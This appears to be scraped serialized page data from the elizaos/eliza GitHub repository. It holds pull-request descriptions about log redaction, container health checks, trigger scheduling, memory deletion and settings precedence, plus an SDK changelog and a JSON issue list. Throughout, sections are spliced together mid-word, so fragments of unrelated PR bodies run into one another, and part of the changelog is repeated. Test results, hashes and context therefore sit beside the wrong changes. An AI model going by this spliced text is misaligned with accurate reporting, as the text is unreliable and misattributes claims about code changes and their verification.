without `npm_execpath` fail closed.\n\nMaterial risk: developers who legitimately install with a non-pin Bun (or npm/pnpm/yarn, which never satisfy a Bun pin) now get a failed install with the restore and remediation steps instead of a possibly-mis-built tree — that refusal is the point of the guard, and `--ignore-scripts` remains the documented opt-out.\n\n# Testing\n\n- `EL ]\"}, assignee=[Circular]\n{ [Symbol(Symbol.toPrimitive)]: [Function: value], owner: { ... } }\n```\n\nAfter:\n\n```text\nrequester={\"id\":\"u1\",\"name\":\"Ada\",\"apiKey\":\"[REDACTED]\"}, assignee={\"id\":\"u1\",\"name\":\"Ada\",\"apiKey\":\"[REDACTED]\"}\n{ owner: { id: \"u1\" } }\n```\n\n# Change\n\n- Track only the current ancestor path, so genuine self, mutual, array, Map, and Error-cause cycles remain `[Circular]` while non-cyclic shared references render at each position.\n- Bound repeated-subtree cloning with a private 10,000-unit work budget. A repeated value renders completely or becomes one `[Shared]` marker; refused repeats are memoized so adversarial graphs and changing Proxy key lists cannot force repeated enumeration.\n- Charge repeated keys, elements, entries, and long redacted text before work is performed, including skipped credential/function fields and RegExp sources.\n- Add `Symbol.toPrimitive` only when an ordinary clone owns a `toString` field that would otherwise break coercion. Map/Set clones no longer receive it; Error clones retain their existing protection.\n- Preserve the public `redactLogValue(value, seen, depth)` signature.\n\n# Verification\n\nAt `caf8a34c69533a5207f0c1f95e8ddbb4be0f5bf6`, rebased on `origin/develop` `811c3fac48df3c3e4e8e7414ef78e544fa7dac08` with Bun 1.4.2 and Node 24.15.0:\n\n- `bun x vitest run src/security/log-redaction.test.ts src/security/redact-log-args.test.ts src/logger.native-esm.test.ts`: 3 files, 25 tests passed.\n- Reverse proof with develop's production walker and this branch's tests: 8 passed, 13 failed, covering both shared-reference and clone-symbol regressions.\n- `bun run --cwd packages/core typecheck`: passed.\n- Biome on both changed files: passed.\n- Frozen workspace install: passed offline after dependency population. The archive-based container skipped fused-inference setup because `git archive` cannot contain the native submodule; this core-only change does not touch that integration.\n- Ro unhealthyThreshold` times when `retryOnFailure` is set, and marks it `failed` only if every probe fails. Each result now carries its container ID (previously `\"\"`).\n\n# Testing\n\nNew `packages/cloud/shared/src/lib/services/health-monitor.pglite.test.ts` runs the real sweep and `updateContainerHealth` against a PGlite `containers` table with `fetch` stubbed, using the cron's config:\n\n- a 503 followed by a 200 keeps the container `running` (2 probes);\n- three 503s mark it `failed` (3 probes);\n- one container whose `fetch` throws while another is healthy completes the sweep, marks the first `failed` and keeps the second `running`.\n\nOn develop: `0 pass, 3 fail`. With this change: `3 pass, 0 fail`. `biome check` on the changed files is clean, and `tsc --noEmit` in `packages/cloud/shared` reports nothing for them.\n\n- [x] Targets `develop` and has no conflicts with the latest `origin/develop`.\n- [ ] Ran `bun install` and `bun run verify` after syncing; record blockers below.\n- [ ] Updated relevant documentation.\n\n# Evidence Gate\n\n\u003c!-- evidence-head:8cad84f2a1f1daa10d5b9851f7644273afc0f7f0 --\u003e\n\n\u003c!-- evidence-row:before-screenshots --\u003e\n- [x] N/A - cron service change with no UI surface.\n\u003c!-- evidence-row:after-screenshots --\u003e\n- [x] N/A - cron service change with no UI surface.\n\u003c!-- evidence-row:walkthrough-video --\u003e\n- [x] N/A - cron service change with no UI surface.\n\u003c!-- evidence-row:backend-logs --\u003e\n- [x] Sweep results before and after are in Evidence Details.\n\u003c!-- evidence-row:frontend-logs --\u003e\n- [x] N/A - no frontend change.\n\u003c!-- evidence-row:llm-trajectory --\u003e\n- [x] N/A - no agent, prompt or model change.\n\u003c!-- evidence-row:domain-artifacts --\u003e\n- [x] Container rows' `status` after each sweep is asserted against the PGlite table.\n\u003c!-- evidence-row:ocr-review --\u003e\n- [x] N/A - no rendered visual surface.\n\n# Evidence Details\n\nOn develop:\n\n```text\ ity.test.ts` uses a real `AgentRuntime` with a default-priority `local-llm` and a priority-50 `cloud-llm` provider:\n\n- After the unload, the ownership is `[\"cloud-llm\"]`, `TEXT_LARGE` keeps only `local-llm`, and `getModel` returns the local handler.\n- A reload keeps exactly `[\"cloud-llm\", \"local-llm\"]`, and a later unload leaves `local-llm`.\n\nBoth fail on develop (`expected [ 'local-llm' ] to deeply equal [ 'cloud-llm' ]` and `expected [ 'cloud-llm', 'cloud-llm' ] to deeply equal [ 'cloud-llm', 'local-llm' ]`) and pass with this change. `src/__tests__` plus the core suites that exercise `registerPlugin`/`registerModel` give 17 files and 558 tests passing on the pinned Node 24.15.0. `biome check` and `tsc --noEmit` report nothing for the changed files.\n\n- [x] Targets `develop` and has no conflicts with the latest `origin/develop`.\n- [ ] Ran `bun install` and `bun run verify` after syncing; record blockers below.\n- [ ] Updated relevant documentation.\n\n# Evidence Gate\n\n\u003c!-- evidence-head:ff32080fe8cdf2f15d38c2ba1904e329cae82fb0 --\u003e\n\n\u003c!-- evidence-row:before-screenshots --\u003e\n- [x] N/A - runtime plugin-lifecycle change with no UI surface.\n\u003c!-- evidence-row:after-screenshots --\u003e\n- [x] N/A - runtime plugin-lifecycle change with no UI surface.\n\u003c!-- evidence-row:walkthrough-video --\u003e\n- [x] N/A - runtime plugin-lifecycle change with no UI surface.\n\u003c!-- evidence-row:backend-logs --\u003e\n- [x] Registered model providers after unload and reload, before and after, are in Evidence Details.\n\u003c!-- evidence-row:frontend-logs --\u003e\n- [x] N/A - no frontend change.\n\u003c!-- evidence-row:llm-trajectory --\u003e\n- [x] N/A - handlers are stubs; this changes which handler stays registered, not model behavior.\n\u003c!-- evidence-row:domain-artifacts --\u003e\n- [x] N/A - in-memory registry only.\n\u003c!-- evidence-row:ocr-review --\u003e\n- [x] N/A - no rendered visual surface.\n\n# Evidence Details\n\nOn y, is deduplicated again, and the trigger never runs again.\n\nTwo ordinary ways in: two triggers on one workflow landing in the same minute (a monthly trigger on the 1st and a Mondays trigger when the 1st is a Monday), or a failure after dispatch but before the metadata write, after which `TaskService`'s retry reuses the key.\n\n# Change\n\nThe early return stays for `source === \"event\"`. For scheduler and manual fires, a deduplicated dispatch now re-reads the live task, advances the trigger to its next occurrence with `buildTriggerMetadata`, refreshes the key, persists it, and returns `skipped` with the new `updateInterval`. `runCount`, the run log and notifications are untouched, so a deduplicated fire still isn't counted as a run. The key derivation is shared with the normal persist path through a small helper.\n\n# Testing\n\nNew `packages/agent/src/triggers/trigger-dedup-advance.test.ts` runs a Mondays cron trigger through the real `executeTriggerTask`. The dispatch service deduplicates repeated keys, the trigger's key has already been used for Jun 1, and the clock is faked.\n\n- On develop: the Jun 1 fire returns no `updateInterval` (`expected 'undefined' to be 'number'`), the schedule stays at Jun 1, and the Jun 8 fire is deduplicated again.\n- With this change: the Jun 1 fire is skipped and advances to Jun 8, and the Jun 8 fire runs (`executions: [\"2026-06-08T09:00:01.000Z\"]`).\n- The agent trigger tests pass 8/8 on the pinned Node 24.15.0, and plugin-workflow's `trigger-routes`, `trigger-ownership` and `workflow-dispatch` suites pass 20/20.\n- `biome check` on the changed files is clean, and `tsc --noEmit` reports nothing for `src/triggers`.\n\n- [x] Targets `develop` and has no conflicts with the latest `origin/develop`.\n- [ ] Ran `bun install` and `bun run verify` after syncing; record blockers below.\n- [ ] Updated relevant documentation.\n\n# Evidence Gate\n\n\u003c!-- evidence-head:6f993e811cc838320cdab08dfba7f9a86de3b25d --\u003e\n\n\u003c!-- evidence-row:before-screenshots --\u003e\n- [x] N/A - scheduler change; the Automations view is unchanged.\n\u003c!-- evidence-row:after-screenshots --\u003e\n- [x] N/A - scheduler change; the Automations view is unchanged.\n\u003c!-- evidence-row:walkthrough-video --\u003e\n- [x] N/A - spans weeks of schedule time; the test drives it with a fake clock.\n\u003c!-- evidence-row:backend-logs --\u003e\n- [x] Fire results and executions before and after are in Evidence Details.\n\u003c!-- evidence-row:frontend-logs --\u003e\n- [x] N/A - no frontend change.\n\u003c!-- evidence-row:llm-trajectory --\u003e\n- [x] N/A - no agent, prompt or model change.\n\u003c!-- evidence-row:domain-artifacts --\u003e\n- [x] The persisted `nextRunAtMs` and the following executions are asserted in the test.\n\u003c!-- evidence-row:ocr-review --\u003e\n- [x] N/A - no rendered visual surface.\n\n# Evidence Details\n\nOn develop, with the real plugin-workflow dispatch service and two triggers on one workflow:\n\n```text\nJun 1  monthly: success | mondays: skipped updateInterval: undefined\nmondays persisted nextRunAtMs: 2026-06-01T09:00:00.000Z key: wf-report:29671740\nJun 8 mondays: skipped | Jun 15 mondays: skipped | executions: [ \"2026-06-01T09:00:01.000Z\" ]\n```\n\nNew test without / with the change:\n\n```text\nAssertionError: expected 'undefined' to be 'number'\n---\nTests  1 passed (1)\n```\n\n## Known gaps / failures\n\n- I didn't run `bun run verify` locally: the root postinstall fails on an unrelated native/plugin build on this machine.\n- The key is still scoped by workflow, so two triggers on one workflow in the same minute still collapse to one execution for that occurrence. That is unchanged; this PR only ensures neither trigger stalls afterwards.\n\nAI provider/model: anthropic / claude-opus-5-5\nClient / agent tooling: claude-code\nContribution skill revision: N/A - ordinary GitHub contribution without optional run evidence\nAttribution status: self-reported\n— [contributor]\n\ teMemory`, `deleteManyMemories`, `deleteAllMemories`) cascade only through `getMemoryFragments`, which matches `metadata.documentId`. Deleting a large message therefore removes the parent row and leaves the full text behind, whether it comes from deleting a conversation message (`conversation-message-service.ts`), clearing a channel (`deleteAllMemories([roomId], \"messages\")`), deleting a single message, or the memory-retention sweep. The leftover rows still show up in `listMemoryTypes`, and agent export copies every type, so \"deleted\" message text ends up in exported bundles.\n\n# Change\n\n`getMemoryFragments` also matches `message_content_segments` rows whose `metadata.messageId` is the deleted memory's id. Every delete path already goes through this helper, so segments are now removed in the same transaction as their parent. The query is covered by the existing partial index `idx_message_content_byte_seek` on `(agent_id, metadata-\u003e\u003e'messageId', …)`.\n\n# Testing\n\n`message-content-segments.real.test.ts` gains a case that publishes three oversized messages on real PGlite (migrated schema), deletes one each via `deleteMemory`, `deleteManyMemories` and `deleteAllMemories`, and checks that no segment rows remain.\n\n- Fails on develop (the segment rows survive) and passes with the change.\n- `bun run test:real` for `cascade-delete`, `message-content-segments`, `base-adapter-methods` and `base-comprehensive`: 4 files, 32 tests passed.\n- `biome check` on the changed files is clean, and `tsc --noEmit` reports nothing for them.\n\n- [x] Targets `develop` and has no conflicts with the latest `origin/develop`.\n- [ ] Ran `bun install` and `bun run verify` after syncing; record blockers below.\n- [ ] Updated relevant documentation.\n\n# Evidence Gate\n\n\u003c!-- evidence-head:555daa092bd6c622058436852180552795d678af --\u003e\n\n\u003c!-- evidence-row:before-screenshots --\u003e\n- [x] N/A - storage-adapter change with no UI surface.\n\u003c!-- evidence-row: d by that name\u003c/li\u003e\n\u003cli\u003eAdded \u003ccode\u003eapplied.ultracodeAvailable\u003c/code\u003e and \u003ccode\u003eapplied.ultracodeRequested\u003c/code\u003e to \u003ccode\u003egetSettings()\u003c/code\u003e: whether this session can run Ultracode, and whether it is requested, independent of whether it is in effect\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003eforkSession()\u003c/code\u003e copies reading back the wrong history when cut at a progress row or fork briefing after a rewind, or when the session was compacted with some messages kept\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003egetSessionMessages()\u003c/code\u003e leaving out messages from other agents, sessions and channels that the CLI transcript shows\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003e{ decision: 'block' }\u003c/code\u003e returned by Elicitation and ElicitationResult hook callbacks being ignored; it now declines the MCP elicitation\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003equery()\u003c/code\u003e closing stdin before a follow-up turn woken by a finished background agent, which failed that turn's hooks, \u003ccode\u003ecanUseTool\u003c/code\u003e and SDK MCP calls with \u0026quot;Stream closed\u0026quot;\u003c/li\u003e\n\u003cli\u003eChanged the first turn to still wait up to 2s for connecting MCP servers named in \u003ccode\u003eallowedTools\u003c/code\u003e or by an \u003ccode\u003emcp_tool\u003c/code\u003e hook, even with \u003ccode\u003eCLAUDE_CODE_MCP_STARTUP_WAIT_MS\u003c/code\u003e set to \u003ccode\u003e0\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eChanged \u003ccode\u003eapplyFlagSettings({ ultracode: true })\u003c/code\u003e to keep the current effort level instead of switching to \u003ccode\u003exhigh\u003c/code\u003e; an \u003ccode\u003eeffortLevel\u003c/code\u003e that changes the level without \u003ccode\u003eultracode\u003c/code\u003e turns Ultracode off\u003c/li\u003e\n\u003cli\u003eUpdated to parity with Claude Code v2.1.284 esult hook callbacks being ignored; it now declines the MCP elicitation\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003equery()\u003c/code\u003e closing stdin before a follow-up turn woken by a finished background agent, which failed that turn's hooks, \u003ccode\u003ecanUseTool\u003c/code\u003e and SDK MCP calls with \u0026quot;Stream closed\u0026quot;\u003c/li\u003e\n\u003cli\u003eChanged the first turn to still wait up to 2s for connecting MCP servers named in \u003ccode\u003eallowedTools\u003c/code\u003e or by an \u003ccode\u003emcp_tool\u003c/code\u003e hook, even with \u003ccode\u003eCLAUDE_CODE_MCP_STARTUP_WAIT_MS\u003c/code\u003e set to \u003ccode\u003e0\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eChanged \u003ccode\u003eapplyFlagSettings({ ultracode: true })\u003c/code\u003e to keep the current effort level instead of switching to \u003ccode\u003exhigh\u003c/code\u003e; an \u003ccode\u003eeffortLevel\u003c/code\u003e that changes the level without \u003ccode\u003eultracode\u003c/code\u003e turns Ultracode off\u003c/li\u003e\n\u003cli\u003eUpdated to parity with Claude Code v2.1.284\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e0.3.283\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eAdded \u003ccode\u003eplugin_errors\u003c/code\u003e to the \u003ccode\u003eSDKSystemMessage\u003c/code\u003e type (\u003ccode\u003esystem/init\u003c/code\u003e), including \u003ccode\u003epath\u003c/code\u003e for a \u003ccode\u003e--plugin-dir\u003c/code\u003e entry that did not load\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003egetSessionMessages()\u003c/code\u003e returning, and \u003ccode\u003eforkSession()\u003c/code\u003e copying, a rewound-away branch when the newest branch ends at a meta row or a local command's rows\u003c/li\u003e\n\u003cli\u003eChanged stream-json output to include warnings and notices raised during a turn as \u003ccode\u003esystem/informational\u003c/code\u003e messages; it previously dropped them\u003c/li\u003e\n\u003cli\u003eChanged the \u003ccode\u003eset_max_thinking_tokens\u003c/code\u003e control request: omitting \u003ccode\u003emax_thinking_tokens\u003c/code\u003e now leaves the session's thinking budget unchanged; send \u003ccode\u003enull\u003c/code\u003e to reset it to the session default\u003c/li\u003e\n\u003cli\u003eUpdated to parity with Claude Code v2.1.283\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e0.3.282\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eAdded support for \u003ccode\u003estrictKnownMarketplaces\u003c/code\u003e and \u003ccode\u003eblockedMarketplaces\u003c/code\u003e in host-supplied \u003ccode\u003emanagedSettings\u003c/code\u003e: the allowlist applies only where admin policy sets none; the blocklist adds to the admin's\u003c/li\u003e\n\u003cli\u003eAdded \u003ccode\u003e@anthropic-ai/claude-agent-sdk/core\u003c/code\u003e, a smaller entry point for apps that bundle the SDK (query, MCP tool helpers, session mutations, \u003ccode\u003eresolveSettings\u003c/code\u003e); it uses your installed zod and MCP SDK\u003c/li\u003e\n\u003cli\u003eAdded \u003ccode\u003eprewarm()\u003c/code\u003e and \u003ccode\u003eSpareProcess.claim()\u003c/code\u003e (alpha): start a Claude Code process before its session is known and bind it to a folder and its per-session options later\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003ereadMcpResource()\u003c/code\u003e relaying content \u003ccode\u003e_meta\u003c/code\u003e keys under the CLI-reserved \u003ccode\u003ecom.anthropic/\u003c/code\u003e prefix; they are now dropped, as for tool results\u003c/li\u003e\n\u003cli\u003eUpdated to parity with Claude Code v2.1.282\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e0.3.281\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eAdded optional \u003ccode\u003etrigger\u003c/code\u003e, \u003ccode\u003euser_message_uuid\u003c/code\u003e and \u003ccode\u003etimestamp\u003c/code\u003e fields to the \u003ccode\u003econversation_reset\u003c/code\u003e message so clients can tell what reset the conversation, match a /clear to its message, and show when the reset happened\u003c/li\u003e\n\u003cli\u003eFixed permission and dialog callbacks still being invoked for requests that arrived after \u003ccode\u003eclose()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFixed control requests issued after a query closed hanging or leaking, and permission prompts that could not be cancelled after a cancelled request was redelivered\u003c/li\u003e\n\u003cli\u003eFixed \u003ccode\u003esession_state_changed\u003c/code\u003e staying at \u003ccode\u003erequires_action\u003c/code\u003e after an overlapping permission prompt and sandbox network-access prompt were both answered\u003c/li\u003e\n\u003cli\u003eImproved SDK package size and load time: \u003ccode\u003esdk.mjs\u003c/code\u003e no longer bundles unused dependencies (1.47 MB → 0.97 MB)\u003c/li\u003e\n\u003cli\u003eImproved startup time for \u003ccode\u003equery()\u003c/code\u003e sessions with in-process MCP servers (\u003ccode\u003ecreateSdkMcpServer\u003c/code\u003e) by running their handshake inside the SDK; \u003ccode\u003einitialize\u003c/code\u003e may now wait up to 250 ms for them\u003c/li\u003e\n\u003cli\u003eImproved SDK session start-up: the CLI now answers the host's initialize request before starting its background start-up work\u003c/li\u003e\n\u003cli\u003eChanged the \u003ccode\u003eSettings\u003c/code\u003e type's \u003ccode\u003eattribution\u003c/code\u003e field to \u003ccode\u003eboolean | {...}\u003c/code\u003e; TypeScript code that reads \u003ccode\u003eattribution.commit\u003c/code\u003e from returned settings needs a type narrow\u003c/li\u003e\n\u003cli\u003eUpdated to parity with Claude Code v2.1.281\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e0.3.280\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eAdded optional \u003ccode\u003efireReason\u003c/code\u003e to the task-notification \u003ccode\u003eSDKMessageOrigin\u003c/code\u003e; a local host's declared scheduled-task fire is honored only in a proce g.ts`) copies several keys that aren't credentials into `character.secrets` whenever they are set in the environment, for example `ELIZAOS_CLOUD_BASE_URL`, `ELIZAOS_CLOUD_ENABLED`, `SOLANA_RPC_URL`, `MATTERMOST_BASE_URL` and the `X402_*` flags. Plugins declare some of these as non-sensitive parameters (`ELIZAOS_CLOUD_BASE_URL` and `ELIZAOS_CLOUD_ENABLED` in plugin-elizacloud, `SOLANA_RPC_URL` in auto-trader). When the owner changes one through `PUT /api/plugins/:id`, `persistMutation` calls `runtime.setSetting(key, value|null, param.sensitive=false)`, the plugin applies or reloads, and the route returns `ok: true`. The plugin keeps reading the boot value, for example `cloud-auth.ts` → `getSetting(\"ELIZAOS_CLOUD_BASE_URL\")`, until the agent restarts. Clearing the value is ignored the same way.\n\n`packages/agent/src/runtime/runtime-settings.ts` already works around this precedence by hand for model pins, by deleting matching secret copies before writing.\n\n# Change\n\nWhen the key already exists in `character.secrets`, a non-secret `setSetting` takes the secret branch. The highest-precedence copy is updated (still classified as a secret) or cleared, together with the boot-copied nested snapshot, as an explicit secret write already does. Keys that aren't in `character.secrets` behave exactly as before, and so does the model-pin workaround, which removes the matching copies before it writes.\n\n# Testing\n\nNew case in `packages/core/src/__tests__/runtime-settings.test.ts`: a runtime whose character has `secrets.SOLANA_RPC_URL`. A non-secret update and then a non-secret clear must be visible through `getSetting`.\n\n- On develop: `expected 'https://old-rpc.example' to be 'https://new-rpc.example'`.\n- With this change, on the pinned Node 24.15.0: `src/__tests__` gives 11 files and 477 tests passed (2 skipped).\n- Agent route suites `plugin-management-http`, `provider-route-http` and `system-error-notice`: 8 tests passed. The plugin-elizacloud `cloud-routes.authority en the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n\n\n\u003c/details\u003e\n\nIndependent review at `f742298521b2a1b6e63ba7c001b9d8bc016284d4`: the original bump left the root viem override at 2.55.17, so a frozen install still loaded the old release. Updated the override to 2.56.9 and its required Ox pin to 0.14.45, with exact registry lock metadata, and restored unrelated WASM pins. Bun 1.4.2 frozen install passed; auth, wallet, and Cloud resolve actual viem 2.56.9. Real local signing/recovery, EIP-1559 transaction parsing, and ERC-20 ABI contracts passed, plus 10 wallet tests and the bounded repository verify under Node 24.15.0. No RPC, transaction broadcast, or live wallet claim.\n"])</script><script>self.__next_f.push([1,"6e:T1766,"])</script><script>self.__next_f.push([1,"# Relates to\n\n`GET /api/registry/config` fabricates a mainnet identity when no registry backend exists. `getRegistryServiceIfAvailable()` in `packages/agent/src/api/agent-status-routes.ts` always returns `null` (the external ERC-8004 plugin is no longer bundled), yet the handler defaulted `chainId` to `1` and returned the etherscan URL alongside `configured: false`. Unknown chain IDs fell back to `explorerUrl: \"\"`, a healthy-looking empty string, while sibling fields (`registryAddress`, `collectionAddress`) already use explicit `null`. The header comment promises routes \"degrade to `not configured` / 503\", and the repository DTO invariant requires failed-to-load values to be an explicit error/unavailable state, never a healthy-looking zero/empty string.\n\nNo open issue or PR covers this; `getRegistryConfig` has no UI call sites (only the type and client method exist), and `origin/develop` carries no test for this route.\n\n# Change\n\n- `packages/agent/src/api/agent-status-routes.ts`: `chainId` starts as `null` and stays `null` when no registry service exists or the chain RPC fails (the `catch` no longer keeps a fabricated default). `explorerUrl` is `null` when `chainId` is `null` or unmapped, instead of `\"\"`. Configured-service behavior is unchanged: a resolved chain ID still maps through the same explorer table.\n- `packages/ui/src/api/client-types-cloud.ts`: `RegistryConfig.chainId: number | null` and `explorerUrl: string | null` (additive widening; no call sites to update).\n\nMaterial risk: minimal. The only behavioral change is the unconfigured/unknown-chain response shape (`1`/`\"https://etherscan.io\"`/`\"\"` become `null`). No UI code consumes this endpoint today.\n\n# Testing\n\nAt `d918fa8410439bf2ec3befe80ed8f66e11ba4ffb` (Bun 1.4.0; repo pins Bun 1.3.14 / Node 24.15.0, sandbox runs Node 22):\n\n- Live handler reproduction (`handleAgentStatusRoutes` with `GET /api/registry/config`, registry addresses `0xreg`/`0xcol`, no backend — the only possible state since the resolver always returns `null`):\n  ```json\n  { \"handled\": true, \"body\": { \"configured\": false, \"chainId\": null, \"registryAddress\": \"0xreg\", \"collectionAddress\": \"0xcol\", \"explorerUrl\": null } }\n  ```\n  Before (code at `origin/develop`): `{ configured: false, chainId: 1, explorerUrl: \"https://etherscan.io\", ... }`.\n- `./node_modules/.bin/biome check` on both touched files — pass.\n- `./node_modules/.bin/tsc --noEmit -p packages/agent/tsconfig.json` — pass.\n- `./node_modules/.bin/tsc --noEmit -p packages/ui/tsconfig.json` — pass.\n- No package test suite reintroduces the removed route unit tests (per `packages/agent/AGENTS.md`, the deleted `agent-status-routes.test.ts` stays deleted).\n\n- [x] Targets `develop` and has no conflicts with the latest `origin/develop`.\n- [ ] Ran `bun install` and `bun run verify` after syncin reating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n\n\n\u003c/details\u003e"])</script><script>self.__next_f.push([1,"74:Te6b,"])</script><script>self.__next_f.push([1,"# Relates to\n\n`executeTriggerTask` (`packages/agent/src/triggers/runtime.ts`) re-reads the live task before persisting a run only when `options.source === \"event\"`. Scheduler and manual fires build the next trigger metadata from the task snapshot `TaskService` handed the worker before dispatch, then write it back with `runtime.updateTask`, which replaces `metadata` wholesale.\n\nIf the user pauses or edits an automation while one of its scheduled fires is in flight (`TriggersView` toggle → `PUT /api/triggers/:id` writes `enabled: false`), the fire's write-back restores the stale `trigger.enabled: true`. The worker also returns the old cadence as `nextInterval`, so the automation keeps running after the user turned it off.\n\n# Change\n\nRe-read the task for every source, not just events. The existing branches then persist on top of the live trigger: a deleted task returns `taskDeleted`, and a disabled trigger keeps `DISABLED_TRIGGER_INTERVAL_MS`.\n\n# Testing\n\nNew `packages/agent/src/triggers/trigger-pause-during-fire.test.ts` drives the real `executeTriggerTask` for a scheduler fire whose dispatch blocks. While it's blocked, the stored trigger is paused the way the PUT route does it; then the dispatch is released.\n\n- On develop: `expected true to be false`.\n- With this change it passes.\n- The agent trigger tests (`src/triggers`, `test/trigger-schedule-persistence.test.ts`) pass 8/8 on the pinned Node 24.15.0, and plugin-workflow's `trigger-routes`, `trigger-ownership` and `workflow-dispatch` suites pass 20/20.\n- `biome check` on the changed files is clean, and `tsc --noEmit` reports nothing for `src/triggers`.\n\n- [x] Targets `develop` and has no conflicts with the latest `origin/develop`.\n- [ ] Ran `bun install` and `bun run verify` after syncing ":\"## Defect\\n\\n`normalizeRepositoryInput` in `plugins/plugin-agent-orchestrator/src/services/repo-input.ts` keeps only two path segments, so `https://gitlab.com/group/subgroup/project` becomes `https://gitlab.com/group/subgroup.git`, which can never be a repository (GitLab namespaces cannot hold a project and a subgroup with the same path). The TASKS action's text extractor also captures only two segments. Every coding task for a GitLab subgroup project therefore fails to clone.\\n\\nReproduced on develop `811c3fac48`: `https://gitlab.com/gitlab-org/charts/gitlab` normalizes to `https://gitlab.com/gitlab-org/charts.git`, and `git ls-remote` on that URL fails, while `…/charts/gitlab.git` lists branches.\\n\\n## Acceptance\\n\\n- GitLab URLs keep the full namespace path up to the `/-/` page separator (and legacy page routes).\\n- GitHub and Bitbucket keep `owner/repo`; existing forms normalize as before.\\n- Output still passes `assertSafeGitRemote`.\\n\\nFix: #33108\\n\",\"createdAt\":\"2026-10-02T23:44:09Z\",\"closedAt\":\"2026-10-04T03:12:47Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUogUog\",\"title\":\"fix(cloud): reject malformed Google disconnect bodies before bulk removal\",\"author\":\"hermesagent270-commits\",\"number\":33073,\"repository\":\"elizaos/eliza\",\"body\":\"$14\",\"createdAt\":\"2026-10-02T15:30:21Z\",\"closedAt\":\"2026-10-04T03:12:49Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUocKRQ\",\"title\":\"fix(cloud): reject malformed JSON before optional-body mutations\",\"author\":\"hermesagent270-commits\",\"number\":33070,\"repository\":\"elizaos/eliza\",\"body\":\"$15\",\"createdAt\":\"2026-10-02T15:24:46Z\",\"closedAt\":\"2026-10-04T03:12:51Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUoWsMQ\",\"title\":\"crypto refunds: a malformed or reused refund key is reported as CRYPTO_REFUND_INVALID_AMOUNT\",\"author\":\"nothingxnowhere\",\"number\":33065,\"repository\":\"elizaos/eliza\",\"body\":\"$16\",\"createdAt\":\"2026-10-02T15:17:29Z\",\"closedAt\":\"2026-10-04T03:12:52Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUoQdlA\",\"title\":\"LOGS delete and RUNTIME reload_config report success on unacknowledged responses\",\"author\":\"hermesagent270-commits\",\"number\":33062,\"repository\":\"elizaos/eliza\",\"body\":\"## Defect\\n\\nTwo agent actions report success on a 2xx response that does not carry the route's acknowledgement (the defect 6beb04b5c1 fixed for PLUGIN configure):\\n\\n- LOGS `delete` (`packages/agent/src/actions/logs.ts`): `resp.json().catch(() =\u003e ({}))` and a defaulted `cleared` make a proxy page, `{}`, or `{\\\"cleared\\\":\\\"lots\\\"}` report \\\"Cleared 0 log entries.\\\" with `success: true`.\\n- RUNTIME `reload_config` (`packages/agent/src/actions/runtime.ts`): `{}` or `{\\\"reloaded\\\":false}` reports \\\"No hot-reloadable fields changed.\\\" with `success: true`.\\n\\nReproduced on develop `27dec7b0c3` with the real handlers and a stubbed fetch.\\n\\n## Acceptance\\n\\n- Each op fails with its `*_FAILED` code unless the body matches its route: `{ cleared: \u003cnon-negative integer\u003e }` and `{ reloaded: true, applied: string[], requiresRestart: string[] }`.\\n- Genuine acknowledgements behave as before.\\n\\nFix: #33060\\n\",\"createdAt\":\"2026-10-02T15:09:36Z\",\"closedAt\":\"2026-10-04T03:12:54Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUoPLRQ\",\"title\":\"agent status: canRespond is true on a runtime whose only text handler is the local-inference router\",\"author\":\"nothingxnowhere\",\"number\":33059,\"repository\":\"elizaos/eliza\",\"body\":\"$17\",\"createdAt\":\"2026-10-02T15:07:58Z\",\"closedAt\":\"2026-10-04T03:12:56Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUoIk5w\",\"title\":\"cloud operator scripts: refund, promote-admin and set-billing-email cannot start (unresolvable @/ imports)\",\"author\":\"nothingxnowhere\",\"number\":33054,\"repository\":\"elizaos/eliza\",\"body\":\"$18\",\"createdAt\":\"2026-10-02T14:59:17Z\",\"closedAt\":\"2026-10-04T03:12:59Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUnqlJw\",\"title\":\"fix(cloud): reject malformed Docker-node drain bodies before mutation\",\"author\":\"hermesagent270-commits\",\"number\":33050,\"repository\":\"elizaos/eliza\",\"body\":\"$19\",\"createdAt\":\"2026-10-02T14:19:59Z\",\"closedAt\":\"2026-10-04T03:13:01Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUnkNmA\",\"title\":\"Log redaction clones print a Symbol.toPrimitive line on every object under Bun\",\"author\":\"hermesagent270-commits\",\"number\":33049,\"repository\":\"elizaos/eliza\",\"body\":\"## Defect\\n\\nSince #32957, every plain and Map/Set clone produced by `packages/core/src/security/log-redaction.ts` carries an own non-enumerable `Symbol.toPrimitive`. Bun's console 